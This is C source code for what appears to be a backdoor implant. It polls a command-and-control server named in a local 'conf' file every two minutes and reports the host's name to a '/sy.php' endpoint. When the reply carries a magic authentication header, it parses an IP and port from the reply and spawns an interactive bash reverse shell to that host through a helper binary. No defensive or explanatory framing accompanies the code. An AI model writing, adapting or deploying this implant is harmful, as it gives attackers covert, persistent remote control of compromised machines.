#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#define BUFFER_SIZE 1024


struct args_struct {
    int port;
    char ip[256];
};

void *thread_func(void *input){
    char cmd[256];
    char ip[256];
    int port;

    struct args_struct *args = (struct args_struct *)input;
    strcpy(ip , args->ip);
    port=args->port;

    sprintf(cmd,"bash -c \"./kdd_launch exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%d 2>&1>/dev/null&\"",ip,port);

    system(cmd);
    pthread_exit(NULL);
}




int socket_connect(char *host, in_port_t port){
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;

    if((hp = gethostbyname(host)) == NULL){
        return -1;
    }
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));

    if(sock <0){
        return -1;
    }

    if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) <0){
        return -1;
    }
    return sock;
}




void send_bc(char *ip,int port){
    struct args_struct args;

    pthread_t tid;
    args.port=port;

    strcpy(args.ip,ip);

    pthread_create(&tid, NULL, thread_func, (void *)&args);
}


int main(int argc){
    while(1){

        FILE *fptr=fopen("conf","r");
        char ip_port[256];
        fgets(ip_port,256,fptr);
        char *token;
        char ip[256];
        char port[5];
        int port_i;

        token=strtok(ip_port,":");
        strcpy(ip,token);
        token=strtok(NULL,":");
        strcpy(port,token);
        port_i=atoi(port);

                fclose(fptr);
        int fd;
        fd = socket_connect(ip, port_i);
        if(fd!=-1){
            int correct_host=1;
            char hostname[1024];
            gethostname(hostname, 1024);

            char data[1024];
            sprintf(data,"GET /sy.php HTTP/1.1\r\nHost: %s\r\nHostname: %s\r\n\r\n",hostname,hostname);

            char buffer[BUFFER_SIZE];

            write(fd, data, strlen(data));
            bzero(buffer, BUFFER_SIZE);

            read(fd, buffer, BUFFER_SIZE - 1);
            char parsed[1024];

            if(strstr(buffer,"X-Auth-43245-S-20")==NULL)correct_host=0;

            if(correct_host==1){
                strcpy(parsed,strstr(buffer,"\r\n\r\n"));

                char input[256];

                int i,j;
                for(i=0,j=0;i<strlen(parsed);i++){
                    if(parsed[i]!='\r'&&parsed[i]!='\n'){
                        input[j]=parsed[i];j++;
                    }
                }

                if(strlen(input)>10){
                    if(input[0]!='@'){
                        char bc_ip[256];
                        int bc_port;
                        char bc_port_s[10];
                        token=strtok(input,":");
                        strcpy(bc_ip,token);
                        token=strtok(NULL,":");
                        strcpy(bc_port_s,token);
                        bc_port=atoi(bc_port_s);
                        send_bc(bc_ip,bc_port);
                    }
                }
                bzero(input, 256);
            }

            bzero(parsed, BUFFER_SIZE);
            bzero(buffer, BUFFER_SIZE);
        }
        shutdown(fd, SHUT_RDWR);
        close(fd);
        sleep(120);
    }
}
